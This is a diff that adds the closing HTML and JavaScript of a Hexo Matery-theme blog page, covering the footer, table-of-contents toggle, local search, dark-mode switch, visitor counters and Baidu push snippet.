+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2019-2022</span>
+            
+            <a href="/about" target="_blank">ezy</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/ezy0812" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 白天和黑夜主题 -->
+<div class="stars-con">
+    <div id="stars"></div>
+    <div id="stars2"></div>
+    <div id="stars3"></div>  
+</div>
+
+<script>
+    function switchNightMode() {
+        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
+        setTimeout(function () {
+            $('body').hasClass('DarkMode') 
+            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
+            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
+            
+            setTimeout(function () {
+            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
+                $(this).remove()
+            })
+            }, 2e3)
+        })
+    }
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    
+
+    
+
+    <!-- 雪花特效 -->
+    
+
+    <!-- 鼠标星星特效 -->
+    
+
+    
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
